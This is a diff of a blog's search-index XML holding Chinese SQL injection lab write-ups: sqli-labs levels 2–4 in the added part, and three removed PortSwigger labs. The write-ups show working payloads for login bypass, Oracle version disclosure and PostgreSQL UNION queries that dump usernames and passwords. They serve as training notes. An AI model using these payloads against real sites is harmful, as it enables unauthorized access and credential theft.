+<p><img src="/image/sqli-lab-2~4/8f288018d1eea9196167ca05f5fd7756.png" alt="alt text"></p>
+<p>发现因为1=2条件不成立而不显示结果了，所以我的猜测是正确的<br>
+去翻阅源代码</p>
+<p><img src="/image/sqli-lab-2~4/2609bc91e63d37295b3d95e590c3df1f.png" alt="alt text"></p>
+<p>有这样的一句话:<code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code><br>
+发现我输入的id左右确实没有<code>'</code>闭合<br>
+接下来就和第一题步骤一样，注意不用添加<code>'</code>和<code>--+</code>就好了<br>
+<br><br><br><br>
+<strong>第二题:</strong><br>
+首先依旧是构造?id=1，结果正常显示<br>
+然后先尝试<code>?id=1'</code></p>
+<p><img src="/image/sqli-lab-2~4/cc4509f5010fc74392189e9f71106b80.png" alt="alt text"></p>
+<p>发现报错，但是报错的地方是:<code>'1'') limit 0,1</code><br>
+可以猜测一下我输入的id是被<code>('id')</code>闭合，这样错误的地方才会在<code>')</code>这里<br>
+所以构造:<code>?id=1') and 1=2 --+</code></p>
+<p><img src="/image/sqli-lab-2~4/36383c9a99c9eee15b9b71bc302c9019.png" alt="alt text"></p>
+<p>结果确实因为1=2而不显示，我的猜测是正确的<br>
+查看一下源代码:<code>$sql=&quot;SELECT * FROM users WHERE id=('$id') LIMIT 0,1&quot;;</code><br>
+发现id确实是被<code>('id')</code>闭合</p>
+<p>接下来也和第一题一样，只是要把<code>'</code>改为<code>')</code>，即可得到账号密码<br>
+<br><br><br><br>
+<strong>第四题</strong><br>
+依旧是先尝试?id=1'，但是这次发现居然没有回显</p>
+<p><img src="/image/sqli-lab-2~4/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-26%20185236.png" alt="alt text"></p>
+<p>只好尝试一下其他常见的闭合符号<code>&quot;``%</code>等<br>
+在尝试<code>&quot;</code>后(?id=1&quot;)</p>
+<p><img src="/image/sqli-lab-2~4/4198706c9fba5cd32d0299808c1620e6.png" alt="alt text"></p>
+<p>发现页面报错，观察一下报错结果:<br>
+发现确实有<code>&quot;</code>而且还有<code>)</code><br>
+于是可以初步猜想我输入的id应该是这样的:<code>(&quot;id&quot;)</code><br>
+于是就可以构造?id=1&quot;) and 1=2 --+</p>
+<p><img src="/image/sqli-lab-2~4/638eefe59e5c956fe96414dbb82b27d8.png" alt="alt text"></p>
+<p>成功绕过<br>
+接下来步骤还是和第一题一样，把<code>'</code>改为<code>&quot;)</code>就好了<br>
+查看一下源代码</p>
+<p><img src="/image/sqli-lab-2~4/b28260b157fc94cd0785a9d5a015a27f.png" alt="alt text"></p>
+<p>发现语句是这样的:<br>
+<code>$id = '&quot;' . $id . '&quot;';</code><br>
+<code>$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</code><br>
+先给我输入的id加上<code>&quot;&quot;</code>号在用<code>()</code>闭合<br>
+和我的猜测有一点不一样，绕过方法没有问题，但是还是需要注意一下<br>
+😃</p>
+]]></content>
+      <categories>
+        <category>sqli-lab</category>
+      </categories>
+      <tags>
+        <tag>SQL</tag>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>鲲鹏杯web-[EZ-EL]</title>
     <url>/2026/10/13/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-EZ-EL/</url>
     <content><![CDATA[<h1>鲲鹏杯web-[EZ-EL]</h1>
@@ -643,185 +885,6 @@ flag:<code>NSSCTF{60ad8607-7f07-4fc0-ba19-b5a1e232ab99}</code></p>
       <tags>
         <tag>Web</tag>
         <tag>SSTI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>第一次sql注入的学习(portswigger)</title>
-    <url>/2026/09/24/portswigger-sql-1/</url>
-    <content><![CDATA[<h1>Lab: SQL注入</h1>
-<ul>
-<li>使用portswigger靶场：</li>
-</ul>
-<p><strong>第一题:一个简单的get字符型SQL注入:</strong><br>
-打开靶场发现是一个购物网站<br><br><br></p>
-<p><img src="/image/portswigger-sql-1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-24%20232614.jpeg" alt=""><br><br><br></p>
-<p>这时候发现有几个可以用于分类的按钮，随便点一个:<br>
-<img src="/image/portswigger-sql-1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-24%20232800.png" alt=""><br><br><br><br>
-可以发现只剩下被筛选的商品，但是url那里出现了<br>
-<mark>filter?category=Gifts</mark><br>
-这样一个疑是sql注入入口的网址<br>
-我们尝试在Gifts后面加上 <mark>'</mark><br>
-<img src="/image/portswigger-sql-1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-24%20232931.png" alt=""><br>
-发现似乎能购控制筛选结果，基本可以确定SQL入口在这里</p>
-<p>构造payload: <mark>filter?category=Gifts' OR 1=1--+</mark><br>
-(+号也可以换成空格，我这里为了更直观的展示，使用+号)<br>
-<img src="/image/portswigger-sql-1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-24%20233107.png" alt=""><br>
-<br><br><br>
-可以发现在选择筛选结果的情况下，依旧能够显示所有的商品，这样就完成了这个靶场的要求<br>
-<br><br><br><br><br>
-<strong>第二题:登入绕过SQL注入</strong><br>
-打开靶场，没有出现筛选选项，但是注意到右上角有账号登入入口<br>
-<img src="/image/portswigger-sql-1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-24%20233208.png" alt=""><br><br><br>
-点击后出现登入框<br><br><br>
-<img src="/image/portswigger-sql-1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-24%20233218.png" alt=""><br>
-从靶场提示中可以拿到一个用户名&quot;administrator&quot;<br>
-<img src="/image/portswigger-sql-1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-24%20233327.png" alt=""><br>
-按照知识点的提示，可以知道这题需要尝试使用SQL注入实现任意密码登入<br>
-先构造  &quot;administrator'--+&quot;<br>
-可以猜想&quot; --+ &quot;可以将password前面的  ' 给注释掉，说不定能使--+后面全部内容被数据库忽略，密码判断直接失效，<br>
-直接尝试，发现成功实现无密码登入<br>
-<img src="/image/portswigger-sql-1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-24%20233351.png" alt=""><br>
-成功完成靶场要求  😐<br>
-<br><br><br><br><br>
-在文档中还发现自己的一个知识点盲区(数据库还有分成四种)</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">名称</th>
-<th style="text-align:center">出现</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">Oracle</td>
-<td style="text-align:center">甲骨文公司的大型商业数据库，企业、老系统用得多</td>
-</tr>
-<tr>
-<td style="text-align:center">Microsoft(SQL Server)</td>
-<td style="text-align:center">Windows 服务器常用的数据库</td>
-</tr>
-<tr>
-<td style="text-align:center">PostgreSQL</td>
-<td style="text-align:center">开源强大数据库，很多现代网站、靶场会出现</td>
-</tr>
-<tr>
-<td style="text-align:center">MySQL</td>
-<td style="text-align:center">PHP+MySQL，Web 安全练习最常碰到</td>
-</tr>
-</tbody>
-</table>
-<p>四种数据库SQl注入的语法好像有所不同，还需要进一步学习</p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>SQL</tag>
-        <tag>Web</tag>
-        <tag>portswigger</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL注入攻击，查询Oracle数据库类型和版本</title>
-    <url>/2026/11/06/portswigger-sql-2/</url>
-    <content><![CDATA[<h1>Lab: SQL注入攻击，查询Oracle数据库类型和版本</h1>
-<ul>
-<li>使用portswigger靶场：</li>
-</ul>
-<p>之前使用的sql-lab靶场全部都是MYSQL的数据库,但是不同数据库注入语法有所不同，这篇是oracle数据库的sql注入</p>
-<p>打开靶场，在页面中随便点一点后，发现点击商品分类后，地址栏出现<code>?category=</code>,这时候就可以判断这是get型的注入</p>
-<p><img src="/image/portswigger-sql-2/1.png" alt="alt text"></p>
-<p><img src="/image/portswigger-sql-2/2.png" alt="alt text"></p>
-<p>尝试了一些基本的闭合方式，最后确认是<code>'</code>闭合<br>
-于是构造<code>?category='</code><br>
-发现出现空白页面，以及回显了一些奇怪的字符</p>
-<p><img src="/image/portswigger-sql-2/3.png" alt="alt text"></p>
-<p>首先先确定列数<br>
-构造<code>?categoty=' order by 1--</code><br>
-<code>?categoty=' order by 2--</code><br>
-<code>?categoty=' order by 3--</code><br>
-发现<code>3</code>的时候页面空白报错，可以确定此题是两列</p>
-<p><img src="/image/portswigger-sql-2/4.png" alt="alt text"><br>
-<img src="/image/portswigger-sql-2/5.png" alt="alt text"></p>
-<p>还有一种方法是构造<code>?categoty=' union select 'abc','abc' from dual--</code><br>
-发现页面返回两列，也可以确定</p>
-<p><strong>注：Oracle 必须写 FROM dual！这是 Oracle 和 MySQL 最大区别<br>
-Oracle 每一条 SELECT <strong>必须带 FROM</strong>，不能直接 <code>select null</code>，要用伪表 <code>dual</code></strong></p>
-<p><img src="/image/portswigger-sql-2/6.png" alt="alt text"></p>
-<p>最后构造<code>?category=' union select banner,null from v$version--</code><br>
-成功获得版本号，靶场也提示注入成功</p>
-<p><img src="/image/portswigger-sql-2/7.png" alt="alt text"></p>
-<p>最后有一点我没遇到的：<br>
-<code>UNION</code> 要求<strong>对应位置的数据类型兼容</strong>：数字列放字符串会报错，字符串列放文本才正常。<br>
-我最开始使用的就是字符串，这一题也恰好支持字符串</p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>SQL</tag>
-        <tag>Web</tag>
-        <tag>portswigger</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL 注入攻击，列出非 Oracle 数据库的内容</title>
-    <url>/2026/11/08/portswigger_sql_3/</url>
-    <content><![CDATA[<h1>Lab: SQL 注入攻击，列出非 Oracle 数据库的内容</h1>
-<ul>
-<li>使用portswigger靶场：</li>
-</ul>
-<p>这是PostgreSQL数据库<br>
-题目告诉我们需要通过sql注入获取数据库中的信息,以此来获取所有用户的用户名和密码</p>
-<p><img src="/image/portswigger-sql-3/1.png" alt="alt text"></p>
-<p>开始还是和上一篇一样测出有几个注入点<br>
-然后构造</p>
-<p><code>-1'+union+select+'11',current_schema--+</code></p>
-<p>(因为是在bp中输入，所以将空格改为'+'号)<br>
-<img src="/image/portswigger-sql-3/2.png" alt="alt text"><br>
-成功得到库名:<code>public</code><br>
-构造<br>
-<code>-1'+union+select+'11',table_name+from+information_schema.tables+where+table_schema='public'--+</code></p>
-<p><img src="/image/portswigger-sql-3/3.png" alt="alt text"></p>
-<p>得到表名,注意到有一个名为<code>users_xuturi</code>的表，我要寻找的账户密码大概率在这里面<br>
-然后构造:<br>
-<code>-1'+union+select+'11',column_name+from+infromation_schema.columns+where+table_schema='public'+and+table_name='users_xuturi'</code>来得到三个列名<br>
-<code>username_cusuti</code> , <code>password_gokydw</code>,<code>email</code><br>
-比较明显，我要找的账户密码应该就在这里<br>
-<strong>(库里面的表名有可能不一样，我第二次注入得到的和第一次不同)</strong><br>
-最好准备脱库拿账号密码:<br>
-构造:<br>
-<code>-1'+union+select+username_cusuti,password_gokydw+from+public.users_xuturi--+</code></p>
-<p><img src="/image/portswigger-sql-3/4.png" alt="alt text"></p>
-<p>最后输入拿到的账号密码，成功通关</p>
-<p><img src="/image/portswigger-sql-3/5.png" alt="alt text"></p>
-<p>这一题整体的payload和mysql的基本差不多，只需要修改一些小细节,而且PostgreSQL没有group函数和database()<br>
-在拿库名上一些主要的小区别:</p>
-<ul>
-<li>MySQL：<code>database()</code>、<code>schema()</code></li>
-<li>PostgreSQL：<code>current_database()</code>、<code>current_schema()</code></li>
-<li>Oracle：<code>sys_context('userenv','current_schema')</code> / <code>user</code></li>
-</ul>
-<p>我后面也尝试能不能用两个注入口输出三个数据:<br>
-最开始时直接把三个指令拼接在一起:<br>
-<code>-1'+union+select+username_cusuti||'|'||password_gokydw||'|'||email,'NULL'+from+public.users_xuturi--+</code><br>
-但是输出一直时空白，不管是页面渲染还是响应包里面的都没有返回</p>
-<p><img src="/image/portswigger-sql-3/6.png" alt="alt text"><br>
-<img src="/image/portswigger-sql-3/7.png" alt="alt text"></p>
-<p>后面修改为concat函数:<br>
-<code>-1'+union+select+concat(username_cusuti,chr(124),password_gokydw,chr(124),email),NULL+from+public.users_xuturi--+</code></p>
-<p><img src="/image/portswigger-sql-3/8.png" alt="alt text"></p>
-<p>还是可以显示(eamil里面就没有内容)<br>
-后面查询一下资料,可能是这样:只要任意一个值是 NULL，<strong>整个拼接结果直接变成 NULL</strong>，页面就看不到这条数据<br>
-但是我也尝试两个拼接，一个单独显示，输出依旧是空白</p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>SQL</tag>
-        <tag>Web</tag>
-        <tag>portswigger</tag>
       </tags>
   </entry>
 </search>
